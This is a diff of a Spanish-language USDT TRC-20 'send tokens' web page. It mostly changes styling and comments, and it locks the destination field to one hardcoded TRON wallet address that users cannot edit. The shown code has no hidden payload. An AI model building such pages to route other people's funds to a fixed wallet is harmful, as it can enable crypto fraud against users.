@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Transferencia Unificada</title>
+    <title>dApp USDT TRC-20 - Red Principal</title>
     
-    <!-- Estilos Optimizados para Carga Instantánea, Fondo Blanco y Botón Azul -->
+    <!-- Estilos Optimizados: Fondo Blanco, Botón Azul y Texto de Red Rojo -->
     <style>
         * {
             box-sizing: border-box;
@@ -13,7 +13,7 @@
             padding: 0;
         }
         body {
-            font-family: sans-serif; /* Fuente nativa del sistema para evitar peticiones externas y acelerar la carga */
+            font-family: sans-serif; /* Evita peticiones de fuentes externas para máxima velocidad */
             background-color: #ffffff; /* Fondo de pantalla blanco */
             color: #1e293b;
             display: flex;
@@ -67,11 +67,13 @@
             background-color: #f1f5f9;
             cursor: not-allowed;
         }
-        /* Clase específica solicitada para colocar la red en color rojo */
-        .red-text {
+        
+        /* CORRECCIÓN: Estilo forzado para el texto de la red en color ROJO */
+        .red-text-input {
             color: #dc2626 !important; 
-            font-weight: bold;
+            font-weight: bold !important;
         }
+        
         #connectBtn {
             width: 100%;
             padding: 14px;
@@ -113,19 +115,19 @@
     <div class="container">
         <h2>Enviar Tokens</h2>
 
-        <!-- Componente Red TRON (TRC-20) Automatizada en Color Rojo -->
+        <!-- Red TRON (TRC-20) en color ROJO -->
         <div class="form-group">
             <label>Red seleccionada</label>
-            <input type="text" value="TRON (TRC-20)" disabled class="red-text">
+            <input type="text" value="TRON (TRC-20)" disabled class="red-text-input">
         </div>
 
-        <!-- Componente Dirección Automática Fija con el valor solicitado -->
+        <!-- Dirección de Destino fija con tu Wallet solicitada -->
         <div class="form-group">
             <label for="addressInput">Dirección de destino</label>
-            <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold;">
+            <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold; color: #334155;">
         </div>
 
-        <!-- Componente Monto (Input Manual) -->
+        <!-- Cantidad (Input Manual) -->
         <div class="form-group">
             <label for="amountInput">Cantidad a enviar (USDT)</label>
             <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
@@ -193,7 +195,7 @@
 
             let procesoEnCurso = false;
 
-            // Dirección de destino estricta e inmutable para el envío
+            // Dirección de destino fija con tu Wallet solicitada
             const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
 
             function setStatus(message, type = 'info') {
@@ -209,7 +211,7 @@
                 btn.disabled = disabled;
             }
 
-            // Asegurar la correspondencia del campo visual con el valor de red
+            // Asegurar que visualmente se mantenga la wallet correcta cargada
             if (addressInput) {
                 addressInput.value = DIRECCION_DESTINO_FIJA;
             }
@@ -253,4 +255,4 @@
                         if (tx) {
                             setStatus('¡Transferencia realizada con éxito!', 'success');
                             if (input) input.value = '';
-
+                            
